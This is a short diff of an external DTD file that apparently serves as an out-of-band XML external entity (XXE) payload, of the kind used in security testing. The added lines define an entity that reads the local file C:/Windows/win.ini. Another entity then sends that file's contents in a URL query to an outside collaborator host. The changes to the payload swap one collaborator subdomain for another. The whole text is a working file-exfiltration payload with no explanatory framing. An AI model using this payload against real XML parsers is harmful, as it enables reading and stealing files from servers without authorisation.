@@ -1,2 +1,3 @@
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://rd8bfl5wczpn12hjn1mozzp25tbjz8.cigitalcollaborator.com/?collect=%file;'>">
+<!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://9fpeh43dqdm0hiylqsu5m8h5qwwmkb.cigitalcollaborator.com/?collect=%file;'>">
 %all;
